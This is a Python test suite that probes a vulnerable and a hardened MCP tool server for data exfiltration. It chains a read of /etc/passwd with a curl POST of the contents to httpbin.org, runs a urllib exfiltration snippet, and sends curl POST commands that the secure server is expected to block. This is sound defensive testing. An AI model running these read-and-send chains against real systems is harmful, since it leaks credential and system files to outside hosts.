"""
Test data exfiltration capabilities via curl POST.

This tests if agents can:
1. Read sensitive data (e.g., /etc/passwd)
2. Exfiltrate it via curl POST to external server

Tests both vulnerable and secure MCP servers.
"""

import httpx
import json
from typing import Dict, Any
from datetime import datetime


class DataExfiltrationTester:
    """Test data exfiltration attack vectors."""

    def __init__(self, mcp_url: str = "http://localhost:8000"):
        self.mcp_url = mcp_url
        self.server_type = "VULNERABLE" if "8000" in mcp_url else "SECURE"
        self.client = httpx.Client(
            timeout=30.0,
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json, text/event-stream"
            }
        )
        self.results = []

    def call_mcp_tool(self, tool_name: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
        """Call an MCP tool and return the result."""
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": tool_name,
                "arguments": arguments
            }
        }

        try:
            response = self.client.post(
                f"{self.mcp_url}/mcp",
                json=payload
            )
            data = response.json()
            if "result" in data:
                return data["result"]
            elif "error" in data:
                return {"error": data["error"]}
            return data
        except Exception as e:
            return {"error": str(e)}

    def extract_output(self, result: Any) -> str:
        """Extract text output from MCP response."""
        if isinstance(result, dict):
            if "content" in result and isinstance(result["content"], list) and len(result["content"]) > 0:
                return result["content"][0].get("text", "")
            elif "error" in result:
                return str(result["error"])
        return str(result)

    # ========================================================================
    # VULNERABLE SERVER TESTS (port 8000)
    # ========================================================================

    def test_vulnerable_curl_post_exfiltration(self):
        """Test POST data exfiltration on vulnerable server."""
        print(f"\n{'='*80}")
        print(f"Testing Data Exfiltration on {self.server_type} Server ({self.mcp_url})")
        print(f"{'='*80}")

        # Test 1: Simple POST with curl_request tool
        print("\n[Test 1] Simple POST with curl_request tool")
        result = self.call_mcp_tool("curl_request", {
            "url": "https://httpbin.org/post",
            "method": "POST",
            "data": "secret=test_data_123"
        })
        output = self.extract_output(result)
        success = "test_data_123" in output and "error" not in output.lower()
        print(f"Result: {'✓ SUCCESS' if success else '✗ FAILED'}")
        print(f"Output: {output[:200]}...")

        # Test 2: Exfiltrate file contents via POST
        print("\n[Test 2] Read file and exfiltrate via POST")
        # First read a file
        read_result = self.call_mcp_tool("read_file", {"filename": "/etc/hostname"})
        file_content = self.extract_output(read_result)

        if "Error" not in file_content:
            # Try to exfiltrate it
            exfil_result = self.call_mcp_tool("curl_request", {
                "url": "https://httpbin.org/post",
                "method": "POST",
                "data": f"exfiltrated_data={file_content[:50]}"
            })
            exfil_output = self.extract_output(exfil_result)
            success = file_content[:20] in exfil_output
            print(f"File read: {file_content[:50]}")
            print(f"Exfiltration: {'✓ SUCCESS' if success else '✗ FAILED'}")
            print(f"Server response: {exfil_output[:200]}...")

        # Test 3: Chained attack - read sensitive file + exfiltrate
        print("\n[Test 3] Chain: read /etc/passwd → POST to external server")
        passwd_result = self.call_mcp_tool("read_file", {"filename": "/etc/passwd"})
        passwd_content = self.extract_output(passwd_result)

        if "root:" in passwd_content:
            # Attempt exfiltration
            exfil_result = self.call_mcp_tool("curl_request", {
                "url": "https://httpbin.org/post",
                "method": "POST",
                "headers": "Content-Type: application/json",
                "data": json.dumps({"stolen_passwd": passwd_content[:200]})
            })
            exfil_output = self.extract_output(exfil_result)
            success = "stolen_passwd" in exfil_output or "root:" in exfil_output
            print(f"Read /etc/passwd: ✓ SUCCESS (got {len(passwd_content)} bytes)")
            print(f"Exfiltration: {'🚨 CRITICAL VULN' if success else '✗ FAILED'}")
            print(f"Server response: {exfil_output[:200]}...")

        # Test 4: Use execute_python_code to exfiltrate
        print("\n[Test 4] Python-based exfiltration")
        python_exfil = """
import urllib.request
import urllib.parse
data = urllib.parse.urlencode({'secret': 'exfiltrated_via_python'}).encode()
req = urllib.request.Request('https://httpbin.org/post', data=data)
response = urllib.request.urlopen(req)
response.read().decode()
"""
        python_result = self.call_mcp_tool("execute_python_code", {"code": python_exfil})
        python_output = self.extract_output(python_result)
        success = "exfiltrated_via_python" in python_output
        print(f"Python exfiltration: {'🚨 SUCCESS' if success else '✗ FAILED'}")
        print(f"Output: {python_output[:200]}...")

    # ========================================================================
    # SECURE SERVER TESTS (port 8001)
    # ========================================================================

    def test_secure_curl_post_blocked(self):
        """Test that POST data exfiltration is blocked on secure server."""
        print(f"\n{'='*80}")
        print(f"Testing Data Exfiltration BLOCKING on {self.server_type} Server ({self.mcp_url})")
        print(f"{'='*80}")

        # Test 1: Try curl POST via execute_shell_command
        print("\n[Test 1] Attempt curl POST via execute_shell_command")
        result = self.call_mcp_tool("execute_shell_command", {
            "command": "curl -X POST -d 'secret=data' https://httpbin.org/post"
        })
        output = self.extract_output(result)
        blocked = "error" in output.lower() or "not allowed" in output.lower() or "-X" in output
        print(f"Result: {'✓ BLOCKED' if blocked else '🚨 VULNERABLE'}")
        print(f"Output: {output[:200]}...")

        # Test 2: Try curl with -d flag
        print("\n[Test 2] Attempt curl -d (data) flag")
        result = self.call_mcp_tool("execute_shell_command", {
            "command": "curl -d 'secret=data' https://httpbin.org/post"
        })
        output = self.extract_output(result)
        blocked = "error" in output.lower() or "not allowed" in output.lower() or "dangerous" in output.lower()
        print(f"Result: {'✓ BLOCKED' if blocked else '🚨 VULNERABLE'}")
        print(f"Output: {output[:200]}...")

        # Test 3: Try curl with --data flag
        print("\n[Test 3] Attempt curl --data flag")
        result = self.call_mcp_tool("execute_shell_command", {
            "command": "curl --data 'secret=data' https://httpbin.org/post"
        })
        output = self.extract_output(result)
        blocked = "error" in output.lower() or "not allowed" in output.lower()
        print(f"Result: {'✓ BLOCKED' if blocked else '🚨 VULNERABLE'}")
        print(f"Output: {output[:200]}...")

        # Test 4: Verify only GET is allowed
        print("\n[Test 4] Verify curl GET is allowed (should work)")
        result = self.call_mcp_tool("execute_shell_command", {
            "command": "curl -s https://httpbin.org/get"
        })
        output = self.extract_output(result)
        success = "httpbin" in output.lower() or "headers" in output.lower()
        print(f"Result: {'✓ ALLOWED (as expected)' if success else '✗ BLOCKED (unexpected)'}")
        print(f"Output: {output[:200]}...")

    def generate_report(self):
        """Generate summary report."""
        print(f"\n{'='*80}")
        print(f"DATA EXFILTRATION TEST SUMMARY - {self.server_type} Server")
        print(f"{'='*80}")
        print(f"Target: {self.mcp_url}")
        print(f"Date: {datetime.now().isoformat()}")
        print()

        if self.server_type == "VULNERABLE":
            print("VULNERABLE SERVER FINDINGS:")
            print("- curl_request tool available with full POST capability")
            print("- Can read files and exfiltrate via POST")
            print("- Python urllib also available for exfiltration")
            print("- 🚨 Critical: Multi-step attacks (read + exfiltrate) possible")
        else:
            print("SECURE SERVER FINDINGS:")
            print("- curl POST blocked (only GET allowed)")
            print("- -d and --data flags not in allowed_args")
            print("- -X method flag blocked")
            print("- ✓ Data exfiltration via curl prevented")
            print()
            print("REMAINING RISKS:")
            print("- If Python execution is enabled, urllib could be used")
            print("- Need to verify Python restrictions")


def run_all_tests():
    """Run data exfiltration tests on both servers."""
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    DATA EXFILTRATION TEST SUITE                              ║
║                  Testing curl POST and Data Exfiltration                     ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

    # Test vulnerable server
    print("\n" + "="*80)
    print("PART 1: Testing VULNERABLE Server (port 8000)")
    print("="*80)
    vulnerable_tester = DataExfiltrationTester("http://localhost:8000")
    vulnerable_tester.test_vulnerable_curl_post_exfiltration()
    vulnerable_tester.generate_report()

    # Test secure server
    print("\n\n" + "="*80)
    print("PART 2: Testing SECURE Server (port 8001)")
    print("="*80)
    secure_tester = DataExfiltrationTester("http://localhost:8001")
    secure_tester.test_secure_curl_post_blocked()
    secure_tester.generate_report()

    print("\n" + "="*80)
    print("TESTING COMPLETE")
    print("="*80)


if __name__ == "__main__":
    run_all_tests()
